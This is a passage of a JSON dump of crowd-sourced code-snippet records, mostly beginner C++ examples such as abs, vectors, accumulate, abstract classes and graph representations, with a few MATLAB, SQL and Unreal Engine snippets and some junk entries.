    "title": " Your age doubled is: xx where x is the users age doubled. (print answer with no decimal places)",
    "description": "double the user&rsquo;s age and print &ldquo;Your age doubled is: xx&rdquo; where xx is the user&rsquo;s age doubled. (print answer with no decimal places) \n",
    "reg_date": "2021-10-12T11:37:12.000Z"
  },
  {
    "id": 440,
    "keyword": null,
    "link": null,
    "title": "  ZNSolsEi",
    "description": "demangled: std::ostream::operator<<(int)\n",
    "reg_date": "2021-10-12T11:37:13.000Z"
  },
  {
    "id": 441,
    "keyword": null,
    "link": null,
    "title": " a+b+c whole square",
    "description": "(a + b + c)2 = a2 + b2 + c2 + 2ab + 2bc + 2ca\n",
    "reg_date": "2021-10-12T11:37:13.000Z"
  },
  {
    "id": 442,
    "keyword": null,
    "link": null,
    "title": " a Dynamically allocated array",
    "description": "#include <iostream> #include <cstddef> // std::size_t   int main() {     std::cout << \"Enter a positive integer: \";     std::size_t length{};     std::cin >> length;       int *array{ new int[length]{} }; // use array new.  Note that length does not need to be constant!       std::cout << \"I just allocated an array of integers of length \" << length << '\\n';       array[0] = 5; // set element 0 to value 5       delete[] array; // use array delete to deallocate array       // we don't need to set array to nullptr/0 here because it's going to go out of scope immediately after this anyway       return 0; }\n",
    "reg_date": "2021-10-12T11:37:13.000Z"
  },
  {
    "id": 443,
    "keyword": null,
    "link": null,
    "title": " a bag1 contains red blue and green balls and bag2 contains red blue and green balls in c++",
    "description": "a bag1 contains red blue and green balls and bag2 contains red blue and green balls in c++   \n",
    "reg_date": "2021-10-12T11:37:13.000Z"
  },
  {
    "id": 444,
    "keyword": null,
    "link": null,
    "title": " a function to create double quotes for alphabet in c++",
    "description": "What is your name? Homer Where do you live? Greece Hello, Homer from Greece!\n",
    "reg_date": "2021-10-12T11:37:13.000Z"
  },
  {
    "id": 445,
    "keyword": null,
    "link": null,
    "title": " a variable with 2 independant variables plot",
    "description": "use surface plot with meshgrid\n",
    "reg_date": "2021-10-12T11:37:13.000Z"
  },
  {
    "id": 446,
    "keyword": null,
    "link": null,
    "title": " abs c++",
    "description": "#include <stdlib.h>     /* abs */  int main () {   int n,m;   n=abs(23); // n=23   m=abs(-11); // m=11   return 0; }\n[Mathematics] |x| = abs(x) [C++ Programming]\n",
    "reg_date": "2021-10-12T11:37:13.000Z"
  },
  {
    "id": 447,
    "keyword": null,
    "link": null,
    "title": " abs in c++",
    "description": "#include <iostream> #include <cstdlib> using namespace std;  int main() { \tint x = -5; \tlong y = -2371041;  \tint a = abs(x); \tlong b = abs(y);  \tcout << \"abs(\" << x << \") = |\" << x << \"| = \" << a << endl; \tcout << \"abs(\" << y << \") = |\" << y << \"| = \" << b << endl; }  /* output abs(-5) = |-5| = 5 abs(-2371041) = |-2371041| = 2371041*/\n#include <iostream> #include <cstdlib> using namespace std;  int main() {    // get absolute value of -5   cout << abs(-5);    return 0; }  // Output: 5\n#include <iostream> #include <cstdlib> using namespace std;  int main() { \tint x = -5; \tlong y = -2371041;  \tint a = abs(x); \tlong b = abs(y);  \tcout << \"abs(\" << x << \") = |\" << x << \"| = \" << a << endl; \tcout << \"abs(\" << y << \") = |\" << y << \"| = \" << b << endl; }  returns abs(-5) = |-5| = 5 abs(-2371041) = |-2371041| = 2371041\n[Mathematics] |x| = abs(x) [C++ Programming]\n#include <iostream> #include <cstdlib> using namespace std;  int main() { \tint x = -5; \tlong y = -2371041;  \tint a = abs(x); \tlong b = abs(y);  \tcout << \"abs(\" << x << \") = |\" << x << \"| = \" << a << endl; \tcout << \"abs(\" << y << \") = |\" << y << \"| = \" << b << endl; }\n#include <cmath> abs(number); Ex: abs(-10) = |-10| = 10\n",
    "reg_date": "2021-10-12T11:37:13.000Z"
  },
  {
    "id": 448,
    "keyword": null,
    "link": null,
    "title": " abs in cpp",
    "description": "#include <iostream> #include <cstdlib> using namespace std;  int main() { \tint x = -5; \tlong y = -2371041;  \tint a = abs(x); \tlong b = abs(y);  \tcout << \"abs(\" << x << \") = |\" << x << \"| = \" << a << endl; \tcout << \"abs(\" << y << \") = |\" << y << \"| = \" << b << endl; }  /* output abs(-5) = |-5| = 5 abs(-2371041) = |-2371041| = 2371041*/\n#include <stdlib.h>     /* abs */  int main () {   int n,m;   n=abs(23); // n=23   m=abs(-11); // m=11   return 0; }\n[Mathematics] |x| = abs(x) [C++ Programming]\nint a =4; int b =5;  int ans = abs(a-b); //ALWAYS RETURN POSITIVE NUMBER.\n#include <cmath> abs(number); Ex: abs(-10) = |-10| = 10\n",
    "reg_date": "2021-10-12T11:37:13.000Z"
  },
  {
    "id": 449,
    "keyword": null,
    "link": null,
    "title": " abs val of a number in c++",
    "description": "#include <iostream> #include <cstdlib> using namespace std;  int main() { \tint x = -5; \tlong y = -2371041;  \tint a = abs(x); \tlong b = abs(y);  \tcout << \"abs(\" << x << \") = |\" << x << \"| = \" << a << endl; \tcout << \"abs(\" << y << \") = |\" << y << \"| = \" << b << endl; }\n",
    "reg_date": "2021-10-12T11:37:13.000Z"
  },
  {
    "id": 450,
    "keyword": null,
    "link": null,
    "title": " absolute difference c++",
    "description": "#include <iostream> #include <cstdlib> using namespace std;  int main() { \tint x = -5; \tlong y = -2371041;  \tint a = abs(x); \tlong b = abs(y);  \tcout << \"abs(\" << x << \") = |\" << x << \"| = \" << a << endl; \tcout << \"abs(\" << y << \") = |\" << y << \"| = \" << b << endl; }  /* output abs(-5) = |-5| = 5 abs(-2371041) = |-2371041| = 2371041*/\n[Mathematics] |x| = abs(x) [C++ Programming]\nval1 = abs(22);  val2 = abs(-43);     cout << \"abs(22) = \" << val1 << \"\\n\";  cout << \"abs(-43) = \" << val2 << \"\\n\";\n",
    "reg_date": "2021-10-12T11:37:14.000Z"
  },
  {
    "id": 451,
    "keyword": null,
    "link": null,
    "title": " abstract class in c++",
    "description": "#include <iostream> #include  <string> //Pure virtual function or inteface allows us to define a function in a base class that doesn't have an implementation or definition in the base class and force sub classes to implement that function //Pure virtual function is also called an interface in other languages class Entity { public: \t//virtual std::string GetName() { return \"Entity\"; }//This is a function that is just virtual .Overriding this function in sub class is optional we can instantiate subcllass without overriding  or implementing this function \t \t//Below is an example a Pure Virtual Function \t//It is an unimplemented function ant it forces the  sub class to implement it and define it \t//You will not be able to instantiate sub class without implementing or defining the function in sub class \tvirtual std::string GetName() = 0;    //the pure virtual function must have virtual written at the beginning and =0 at the end  //This function cannot contain any definition in base class,it is just a declaration }; class Player :public Entity { \tstd::string m_name;  public: \tPlayer(const std::string& name) \t\t:m_name(name) \t{}; \tvoid Print() { std::cout << \"This is Sub class\" << std::endl; }; \tstd::string GetName()override { return m_name; };//Pure virtual functions is implemented here in this sub class };  int main() { \t//Entity a;//We can't do this because class Entity contains function that is unimplemented \tPlayer x(\"Jacob\");//This will work because we have implemented or defined the function in this sub class \tstd::cin.get(); }\n#include <iostream> #include  <string> //Pure virtual function  or inteface allows us to define a function in a base class that doesn't have an implementation or definition in the base class and force sub classes to implement that function //Pure virtual function is also called an interface in other languages class Entity { public: \t//virtual std::string GetName() { return \"Entity\"; }//This is a function that is just virtual .Overriding this function in sub class is optional we can instantiate subcllass without overriding  or implementing this function \t \t//Below is an example a Pure Virtual Function \t//It is an unimplemented function ant it forces the  sub class to implement it and define it \t//You will not be able to instantiate sub class without implementing or defining the function in sub class \tvirtual std::string GetName() = 0;    //the pure virtual function must have virtual written at the beginning and =0 at the end  //This function cannot contain any definition in base class,it is just a declaration }; class Player :public Entity { \tstd::string m_name;  public: \tPlayer(const std::string& name) \t\t:m_name(name) \t{}; \tvoid Print() { std::cout << \"This is Sub class\" << std::endl; }; \tstd::string GetName()override { return m_name; };//Pure virtual functions is implemented here in this sub class }; void PrintName(Entity* entity) {  \tstd::cout << entity->GetName() << std::endl; } int main() { \t//Entity a;//We can't do this because class Entity contains function that is unimplemented \tPlayer x(\"Jacob\");//This will work because we have implemented or defined the function in this sub class \tstd::cin.get(); }\n//Code by Soumyadeep Ghosh  //insta : @soumyadepp //linked in : https://www.linkedin.com/in/soumyadeep-ghosh-90a1951b6/ #include <bits/stdc++.h>  using namespace std;  class person {   string p_id;   public:   virtual void get_info()=0; //declaring person as abstract class   virtual void show()=0; };  class student:public person {   string name;   int roll_no;   public:   /*overriding the pure virtual function declared in base class otherwise     this class will become an abstract one and then objects cannot be created     for the same*/     void get_info()     {       cout<<\"Enter name of the student \"<<endl;       cin>>name;       cout<<\"Enter roll number of the student \"<<endl;       cin>>roll_no;     }    void show()    {      cout<<\"Name : \"<<name<<\" Roll number: \"<<roll_no<<endl;    } };  int main() {   person *p;   p=new student;   p->get_info();   p->show();   return 0; } \nstruct Abstract {     virtual void f() = 0; // pure virtual }; // \"Abstract\" is abstract   struct Concrete : Abstract {     void f() override {} // non-pure virtual     virtual void g();     // non-pure virtual }; // \"Concrete\" is non-abstract   struct Abstract2 : Concrete {     void g() override = 0; // pure virtual overrider }; // \"Abstract2\" is abstract   int main() {     // Abstract a; // Error: abstract class     Concrete b; // OK     Abstract& a = b; // OK to reference abstract base     a.f(); // virtual dispatch to Concrete::f()     // Abstract2 a2; // Error: abstract class (final overrider of g() is pure) }\nstruct Abstract {      virtual ~Abstract() = 0; };  Abstract::~Abstract() {}  struct Valid: public Abstract {         // Notice you don't need to actually overide the base         // classes pure virtual method as it has a default };   int main() {     // Abstract        a;  // This line fails to compile as Abstract is abstract     Valid           v;  // This compiles fine. }\n",
    "reg_date": "2021-10-12T11:37:14.000Z"
  },
  {
    "id": 452,
    "keyword": null,
    "link": null,
    "title": " accept the noun and the output of plural c++",
    "description": "noun = getnoun();  // case a/b? if (lastletterof(noun)=='y') {     if (isconsonant(onebutlastletter(noun))     {       // case a!       plural = noun - lastletter;       plural = plural + \"ies\"     }    else    {       // case b!       plural = noun + \"s\"     } } else  {     // noun is not case not a or b, so test for c, d. } output plural;  <div class=\"open_grepper_editor\" title=\"Edit & Save To Grepper\"></div>                \n",
    "reg_date": "2021-10-12T11:37:14.000Z"
  },
  {
    "id": 453,
    "keyword": null,
    "link": null,
    "title": " accepting multiple values from a function in cpp",
    "description": "#include<iostream> using namespace std; void div(int a, int b, int &quotient, int &remainder) {    quotient = a / b;    remainder = a % b; } main() {    int a = 76, b = 10;    int q, r;    div(a, b, q, r);    cout << \"Quotient is: \"<< q <<\"\\nRemainder is: \"<< r <<\"\\n\"; }\n#include<iostream> using namespace std; void div(int a, int b, int \"ient, int &remainder) {    quotient = a / b;    remainder = a % b; } main() {    int a = 76, b = 10;    int q, r;    div(a, b, q, r);    cout << \"Quotient is: \"<< q <<\"\\nRemainder is: \"<< r <<\"\\n\"; }\n",
    "reg_date": "2021-10-12T11:37:14.000Z"
  },
  {
    "id": 454,
    "keyword": null,
    "link": null,
    "title": " access last element in vector in c++",
    "description": "vector<int> v; cout << v[v.size() - 1]; cout << *(v.end() - 1); cout << *v.rbegin(); // all three of them work\n",
    "reg_date": "2021-10-12T11:37:14.000Z"
  },
  {
    "id": 455,
    "keyword": null,
    "link": null,
    "title": " access last element of set c++",
    "description": "set<int> s = {1,2,3} auto it = s.end(); it--; cout<<*it<<\"\\n\"; // This refers to last element of a set\nauto it = s.end(); it--; cout<<*it<<\"\\n\"; \n",
    "reg_date": "2021-10-12T11:37:14.000Z"
  },
  {
    "id": 456,
    "keyword": null,
    "link": null,
    "title": " access part of string in c++",
    "description": "#include <iostream> #include <string.h>  using namespace std; int main() {    string str1 = \"Apples are red\";    string str2 = str1.substr(11, 3);    string str3 = str1.substr(0, 6);     cout << \"Substring starting at position 11 and length 3 is: \" << str2 <<endl;    cout << \"Substring starting at position 0 and length 6 is: \" << str3;    return 0; }\n",
    "reg_date": "2021-10-12T11:37:14.000Z"
  },
  {
    "id": 457,
    "keyword": null,
    "link": null,
    "title": " accumulate() in c++",
    "description": "#include <numeric> // Accumulate #include <vector> // Vector  using namespace std;  int main() {   vector<int> nums{1,2,3,4,5};   int sum = 0;   sum = accumulate(nums.begin(), nums.end(), sum);   // nums.begin() -> first number in a list    // nums.end() -> last number in a list    // sum -> starting value before accumulating: Here its 0 }\naccumulate(first, last, sum); first, last : first and last elements of range                whose elements are to be added               suppose array is 'a'. sum :  initial value of the sum Eg: int sum=0; \taccumulate(a.begin(),a.end(),sum);\n    accumulate(start, end, initial_sum); \n",
    "reg_date": "2021-10-12T11:37:14.000Z"
  },
  {
    "id": 458,
    "keyword": null,
    "link": null,
    "title": " accumulate c++",
    "description": "#include <numeric> // Accumulate #include <vector> // Vector  using namespace std;  int main() {   vector<int> nums{1,2,3,4,5};   int sum = 0;   sum = accumulate(nums.begin(), nums.end(), sum);   // nums.begin() -> first number in a list    // nums.end() -> last number in a list    // sum -> starting value before accumulating: Here its 0 }\naccumulate(first, last, sum); first, last : first and last elements of range                whose elements are to be added               suppose array is 'a'. sum :  initial value of the sum Eg: int sum=0; \taccumulate(a.begin(),a.end(),sum);\n    accumulate(start, end, initial_sum); \n",
    "reg_date": "2021-10-12T11:37:14.000Z"
  },
  {
    "id": 459,
    "keyword": null,
    "link": null,
    "title": " accumulate in cpp",
    "description": "#include <numeric> // Accumulate #include <vector> // Vector  using namespace std;  int main() {   vector<int> nums{1,2,3,4,5};   int sum = 0;   sum = accumulate(nums.begin(), nums.end(), sum);   // nums.begin() -> first number in a list    // nums.end() -> last number in a list    // sum -> starting value before accumulating: Here its 0 }\naccumulate(first, last, sum); first, last : first and last elements of range                whose elements are to be added               suppose array is 'a'. sum :  initial value of the sum Eg: int sum=0; \taccumulate(a.begin(),a.end(),sum);\n    accumulate(start, end, initial_sum); \n",
    "reg_date": "2021-10-12T11:37:14.000Z"
  },
  {
    "id": 460,
    "keyword": null,
    "link": null,
    "title": " accumulate vector c++",
    "description": "#include <numeric> // Accumulate #include <vector> // Vector  using namespace std;  int main() {   vector<int> nums{1,2,3,4,5};   int sum = 0;   sum = accumulate(nums.begin(), nums.end(), sum);   // nums.begin() -> first number in a list    // nums.end() -> last number in a list    // sum -> starting value before accumulating: Here its 0 }\n//Syntax accumulate(first, last, sum); accumulate(first, last, sum, myfun);   first, last : first and last elements of range                whose elements are to be added sum :  initial value of the sum myfun : a function for performing any          specific task. For example, we can         find product of elements between         first and last. //Example   int a[] = {5 , 10 , 15} ;   int res = accumulate(a,a+3,0); // 30\n    accumulate(start, end, initial_sum); \n",
    "reg_date": "2021-10-12T11:37:14.000Z"
  },
  {
    "id": 461,
    "keyword": null,
    "link": null,
    "title": " activity selection problem",
    "description": "// Greedy appraoch TC:O(nlogn) #include<bits/stdc++.h> using namespace std; struct activity {     int start,end; }; bool sort_a(activity s1,activity s2) {     return(s1.end<s2.end); } void max_activity(activity arr[],int n) {     sort(arr,arr+n,sort_a);     int i=0;     cout<<\"(\"<<arr[i].start<<\",\"<<arr[i].end<<\")\"<<endl;     for(int j=1;j<n;j++)     {         if(arr[j].start>=arr[i].end)         {           cout<<\"(\"<<arr[j].start<<\",\"<<arr[j].end<<\")\"<<endl;           i=j;         }     } } int main() {     int n;     cin>>n;     activity arr[n];     for(int i=0;i<n;i++)     {       cin>>arr[i].start>>arr[i].end;     }     max_activity(arr,n);     return 0; } \n",
    "reg_date": "2021-10-12T11:37:15.000Z"
  },
  {
    "id": 462,
    "keyword": null,
    "link": null,
    "title": " add a timer c++",
    "description": "# include <windows.h> # include <iostream> using namespace std;  void timer(int sec) {     Sleep(sec*1000); }  int main() {     cout << \"Wait 5 seconds \" << endl;     timer(5);     cout << \"FireWorks !\" << endl;      return 0; }\n",
    "reg_date": "2021-10-12T11:37:15.000Z"
  },
  {
    "id": 463,
    "keyword": null,
    "link": null,
    "title": " add items to map in c++",
    "description": "mp.insert({ 2, 30 }); \n",
    "reg_date": "2021-10-12T11:37:15.000Z"
  },
  {
    "id": 464,
    "keyword": null,
    "link": null,
    "title": " add on screen debug message ue4",
    "description": "//include needed #include \"Engine/Engine.h\"  //Format void AddOnScreenDebugMessage(uint64 Key, float TimeToDisplay, FColor DisplayColor, const FString & DebugMessage, bool bNewerOnTop, const FVector2D & TextScale);  //Example Code Engine->AddOnScreenDebugMessage(0, 2, FColor::Green, TEXT(\"Example Message\"));  //For more information vist \"https://docs.unrealengine.com/en-US/API/Runtime/Engine/Engine/UEngine/AddOnScreenDebugMessage/1/index.html\"\n",
    "reg_date": "2021-10-12T11:37:15.000Z"
  },
  {
    "id": 465,
    "keyword": null,
    "link": null,
    "title": " add partition mysql",
    "description": "ALTER TABLE t1 ADD PARTITION (PARTITION p3 VALUES LESS THAN (2002));\n",
    "reg_date": "2021-10-12T11:37:15.000Z"
  },
  {
    "id": 466,
    "keyword": null,
    "link": null,
    "title": " add to vector c++",
    "description": "vector<int> a; vector<int> b; // Appending the integers of b to the end of a  a.insert(a.end(), b.begin(), b.end());\nInput:     vector<int> v1{ 10, 20, 30, 40, 50 };     vector<int> v2{ 100, 200, 300, 400 };      //appending elements of vector v2 to vector v1     v1.insert(v1.end(), v2.begin(), v2.end());      Output:     v1: 10 20 30 40 50 100 200 300 400     v2: 100 200 300 400\nvector_name.push_back(element_to_be_added);\n//vector.push_back is the function. For example, if we want to add //3 to a vector, it is just vector.push_back(3) vector <int> vi; vi.push_back(1); //[1] vi.push_back(2); //[1,2]\n// vector::push_back #include <iostream> #include <vector>  int main () {   std::vector<int> myvector;   int myint;    std::cout << \"Please enter some integers (enter 0 to end):\\n\";    do {     std::cin >> myint;     myvector.push_back (myint);   } while (myint);    std::cout << \"myvector stores \" << int(myvector.size()) << \" numbers.\\n\";    return 0; }\n// inserting into a vector #include <iostream> #include <vector>  int main () {   std::vector<int> myvector (3,100);   std::vector<int>::iterator it;    it = myvector.begin();   it = myvector.insert ( it , 200 );    myvector.insert (it,2,300);    // \"it\" no longer valid, get a new one:   it = myvector.begin();    std::vector<int> anothervector (2,400);   myvector.insert (it+2,anothervector.begin(),anothervector.end());    int myarray [] = { 501,502,503 };   myvector.insert (myvector.begin(), myarray, myarray+3);    std::cout << \"myvector contains:\";   for (it=myvector.begin(); it<myvector.end(); it++)     std::cout << ' ' << *it;   std::cout << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:37:15.000Z"
  },
  {
    "id": 467,
    "keyword": null,
    "link": null,
    "title": " add two constant char pointers c++",
    "description": "const char *one = \"Hello \"; const char *two = \"World\";  string total( string(one) + two );  // to use the concatenation as const char*, use: total.c_str() \n",
    "reg_date": "2021-10-12T11:37:15.000Z"
  },
  {
    "id": 468,
    "keyword": null,
    "link": null,
    "title": " add two matrix",
    "description": "#include<iostream> using namespace std;  int main() {     int Matrix_A[3][3] = { { 2,3,4 },                            { 5, 3, 4 },                             { 4, 8, 9 }   };      int Matrix_B[3][3] = { {3,4,5},                          {7,8,9},                           {2,3,4} };     int Matrix_C[3][3];     // for addition                for (int i = 0; i < 3; i++) {                 for (int j = 0; j < 3; j++) {                 Matrix_C[i][j] =  Matrix_A[i][j] + Matrix_B[i][j];                 }         }                         cout << \" THis is the Adding of two Matrix \" << endl;              for (int i = 0; i < 3; i++) {                 for (int j = 0; j < 3; j++) {                     cout << Matrix_A[i][j] << \" + \" << Matrix_B[i][j] << \" = \" << Matrix_C[i][j] << endl;                 }             }  //    }\n",
    "reg_date": "2021-10-12T11:37:15.000Z"
  },
  {
    "id": 469,
    "keyword": null,
    "link": null,
    "title": " add two numbers in c++",
    "description": "#include<iostream> int add(int,int); int main() { \tusing namespace std; \tint a,b; \tcout<<\"Enter first number: \"; \tcin>>a; \tcout<<\"Enter second number: \"; \tcin>>b; \tcout<<\"Sum = \"<<add(a,b); } int add(int x,int y) { \treturn(x+y); }\n#include <iostream> using namespace std;  //function declaration int addition(int a,int b);  int main() { \tint a,b;\t//to store numbers \tint add;\t//to store addition  \t \t//read numbers \tcout<<\"Enter first number: \"; \tcin>>a; \tcout<<\"Enter second number: \"; \tcin>>b; \t \t//call function \tadd=addition(a,b); \t \t//print addition \tcout<<\"Addition is: \"<<add<<endl; \t \treturn 0; }  //function definition int addition(int a,int b) { \treturn (a+b); }\n#include<iostream> using namespace std; int main() { \tdouble number1,number2;   \tdouble sum0;   \tsum=number1+number2;   \tcout<<sum; }\n",
    "reg_date": "2021-10-12T11:37:15.000Z"
  },
  {
    "id": 470,
    "keyword": null,
    "link": null,
    "title": " add variable to legend matlab",
    "description": "str = {strcat('z = ' , num2str(z))}  % at the end of first loop, z being loop output str = [str , strcat('z = ' , num2str(z))] % after 2nd loop % plot your data legend(str{:})\nh1=plot([1:10],'Color','r','DisplayName','This one');hold on; h2=plot([1:2:10],'Color','b','DisplayName','This two'); h3=plot([1:3:10],'Color','k','DisplayName','This three'); legend([h1 h3],{'Legend 1','Legend 3'})\n",
    "reg_date": "2021-10-12T11:37:15.000Z"
  },
  {
    "id": 471,
    "keyword": null,
    "link": null,
    "title": " adddynamic ue4 c++",
    "description": "PerceptionComponent->OnPerceptionUpdated.AddDynamic(this, &AAI_Zombie_Controller::OnPawnDetected);\n",
    "reg_date": "2021-10-12T11:37:16.000Z"
  },
  {
    "id": 472,
    "keyword": null,
    "link": null,
    "title": " adding element in vector c++",
    "description": "Input:     vector<int> v1{ 10, 20, 30, 40, 50 };     vector<int> v2{ 100, 200, 300, 400 };      //appending elements of vector v2 to vector v1     v1.insert(v1.end(), v2.begin(), v2.end());      Output:     v1: 10 20 30 40 50 100 200 300 400     v2: 100 200 300 400\nvector_name.push_back(element_to_be_added);\n//vector.push_back is the function. For example, if we want to add //3 to a vector, it is just vector.push_back(3) vector <int> vi; vi.push_back(1); //[1] vi.push_back(2); //[1,2]\n// inserting into a vector #include <iostream> #include <vector>  int main () {   std::vector<int> myvector (3,100);   std::vector<int>::iterator it;    it = myvector.begin();   it = myvector.insert ( it , 200 );    myvector.insert (it,2,300);    // \"it\" no longer valid, get a new one:   it = myvector.begin();    std::vector<int> anothervector (2,400);   myvector.insert (it+2,anothervector.begin(),anothervector.end());    int myarray [] = { 501,502,503 };   myvector.insert (myvector.begin(), myarray, myarray+3);    std::cout << \"myvector contains:\";   for (it=myvector.begin(); it<myvector.end(); it++)     std::cout << ' ' << *it;   std::cout << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:37:16.000Z"
  },
  {
    "id": 473,
    "keyword": null,
    "link": null,
    "title": " adding string to string array c++",
    "description": "kucing hewan \n#include<iostream> #include <string> int main() { \t//\"Ever thing inside these double quotes becomes const char array\" //\tstd::string namee = \"Caleb\" +\"Hello\";//This will give error because adding const char array to const char array  \tstd::string namee = \"Caleb\"; \tnamee += \" Hello\";//This will work because adding a ptr to a actual string \tstd::cout << namee << std::endl;// output=>Caleb Hello //You can also use the below \tstd::string namee2 = std::string(\"Caleb\")+\" Hello\";// This will work because constructor will convert const char array  to string, adding a ptr to string \tstd::cout << namee2 << std::endl;// output=>Caleb Hello \tstd::cin.get(); }\n",
    "reg_date": "2021-10-12T11:37:16.000Z"
  },
  {
    "id": 474,
    "keyword": null,
    "link": null,
    "title": " adding variables c++",
    "description": "#include <iostream> using namespace std;  int main()  { \tint x = 1; \tint y = 1; \tint total = x + y; \tcout << total; \treturn 0; }\n",
    "reg_date": "2021-10-12T11:37:16.000Z"
  },
  {
    "id": 475,
    "keyword": null,
    "link": null,
    "title": " address sanitizer deadly signal",
    "description": " 1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \n",
    "reg_date": "2021-10-12T11:37:16.000Z"
  },
  {
    "id": 476,
    "keyword": null,
    "link": null,
    "title": " adjacency list representation of graph",
    "description": "//adjacency list implementation;addedge,check if edge exist,delete an edge,display /*            0----->1--------               |        |     |-->4               |->2---->|->3--- */     #include <iostream>  using namespace std; #define v 5 class node { public:     int data;     node*next; }; node*adjlist[v]; void init() {     for(int i=0;i<v;i++)     {         adjlist[i]=NULL;     } } void addedge(int str,int en) {     node*temp=new node;     temp->data=en;     temp->next=adjlist[str];     adjlist[str]=temp; } void hasedge(int str,int en) {     node*temp=new node;     temp=adjlist[str];     while(temp!=NULL)     {         if(temp->data==en)         {             cout<<\"yes:\";         }         temp=temp->next;     }  } void remove(int str,int en) {     if(adjlist[str]==NULL)     {         return;     }      if(adjlist[str]->data==en)     {         node*temp=new node;         temp=adjlist[str];         adjlist[str]=adjlist[str]->next;         delete temp;     }     else     {         node *ptr=new node;         ptr=adjlist[str];         while(ptr->next!=NULL)         {             node*temp=new node;             if(ptr->next->data==en)             {                  temp=ptr->next;                 ptr->next=ptr->next->next;                 delete temp;                 break;             }             ptr=ptr->next;         }     } } void display() {     for(int i=0;i<v;i++)     {         node*temp=new node;         cout<<\"adjlist[]\"<<i<<endl;         temp=adjlist[i];         while(temp!=NULL)         {             cout<<temp->data<<\" \";             temp=temp->next;         }         cout<<endl;     } }  int main() {     init();     addedge(0,1);     addedge(0,2);     addedge(0,3);     addedge(1,3);     addedge(1,4);     addedge(2,3);     addedge(3,4);     display();     hasedge(0,3);     hasedge(0,4);     remove(0,1);     remove(1,4);     display();     return 0; } \n",
    "reg_date": "2021-10-12T11:37:16.000Z"
  },
  {
    "id": 477,
    "keyword": null,
    "link": null,
    "title": " adjacency matrix of a directed graph",
    "description": "/*adjacency matrix implementation of directed graph:  0---->1---|  |         |---->4  |-> 2-->3-|    -------------------------------------------------*/ #include <iostream>  using namespace std; #define v 5 void inti(int mat[][v]) {     for(int i=0;i<v;i++)     {         for(int j=0;j<v;j++)         {             mat[i][j]=0;         }     } } void addedge(int mat[][v],int start,int endvertix) {     mat[start][endvertix]=1; } void printmat(int mat[][v]) {     for(int i=0;i<v;i++)     {         for(int j=0;j<v;j++)         {             cout<<mat[i][j]<<\" \";         }         cout<<endl;      } }  int main() {     int array_in_graph[v][v];     inti(array_in_graph);     addedge(array_in_graph,0,1);     addedge(array_in_graph,0,2);     addedge(array_in_graph,0,3);     addedge(array_in_graph,1,3);     addedge(array_in_graph,1,4);     addedge(array_in_graph,2,3);     addedge(array_in_graph,3,4);     printmat(array_in_graph);     return 0; } \n",
    "reg_date": "2021-10-12T11:37:16.000Z"
  },
  {
    "id": 478,
    "keyword": null,
    "link": null,
    "title": " advanced c++ topics",
    "description": "Class typedef<string T>\n",
    "reg_date": "2021-10-12T11:37:16.000Z"
  },
  {
    "id": 479,
    "keyword": null,
    "link": null,
    "title": " ala vida",
    "description": "aadadas\n",
    "reg_date": "2021-10-12T11:37:16.000Z"
  },
  {
    "id": 480,
    "keyword": null,
    "link": null,
    "title": " algoritmo de bresenham em c codigo",
    "description": "    if(dx == 0){         if(yf > yi){    //linha pra baixo             while(linha.y != yf)             {                  linha.y++;                               putPixel(linha);              }         }         else{           //linha pra cima             while(linha.y != yf)             {                  linha.y--;                                putPixel(linha);              }         }      }     else if(dy == 0){         if(xf > xi){    //linha pra direita             while(linha.x != xf)             {                  linha.x++;                                 putPixel(linha);              }         }         else{           //linha pra esquerda             while(linha.x != xf)             {                  linha.x--;                                 putPixel(linha);              }         }     }\nvoid drawLine(Pixel inicial, Pixel final){     int xi = inicial.x;     int xf = final.x;     int yi = inicial.y;     int yf = final.y;     int dx = abs(xf - xi);     int dy = abs(yf - yi);     int controle = 0;   //Controla se a dire&ccedil;&atilde;o menor vai crescer ou nao;     int incX = 0;     int incY = 0;      //Define se Y e X est&atilde;o indo nas dire&ccedil;&otilde;es positivas ou negativas     if(xf > xi) incX = 1;     else incX = -1;      if(yf > yi) incY = 1;     else incY = -1;      putPixel(inicial);     Pixel linha = {inicial.x, inicial.y, inicial.red, inicial.green, inicial.blue, inicial.alpha};  //Esse pixel &eacute; o que se mover&aacute; e pintar&aacute; a linha\n",
    "reg_date": "2021-10-12T11:37:16.000Z"
  },
  {
    "id": 481,
    "keyword": null,
    "link": null,
    "title": " alias namespaces c++",
    "description": "// Instead of boost::numeric::ublas::vector<double> v;  // Use namespace aliasing namespace ublas = boost::numeric::ublas;  ublas::vector<double> v; \n",
    "reg_date": "2021-10-12T11:37:17.000Z"
  },
  {
    "id": 482,
    "keyword": null,
    "link": null,
    "title": " alias namespc",
    "description": "#include <iostream>  using namespace std;  namespace verylargenamespacename{ int x; namespace nestednamespace{ void display(){ cout << x; } } }  namespace one = verylargenamespacename; namespace nested = one :: nestednamespace; int main() { one ::x = 100; nested :: display(); return 0; }   \n",
    "reg_date": "2021-10-12T11:37:17.000Z"
  },
  {
    "id": 483,
    "keyword": null,
    "link": null,
    "title": " all in one c++",
    "description": "Run time error 19: \"File or function is not found\"\n",
    "reg_date": "2021-10-12T11:37:17.000Z"
  },
  {
    "id": 484,
    "keyword": null,
    "link": null,
    "title": " all library in c++",
    "description": "#include<bits/stdc++.h>\n",
    "reg_date": "2021-10-12T11:37:17.000Z"
  },
  {
    "id": 485,
    "keyword": null,
    "link": null,
    "title": " all of the stars lyrics",
    "description": "printf(\"you are my star and i love you\");\nPrintf(\"You are my star and I love you so much\");\n",
    "reg_date": "2021-10-12T11:37:17.000Z"
  },
  {
    "id": 486,
    "keyword": null,
    "link": null,
    "title": " all pair shortest path algorithm in c with program",
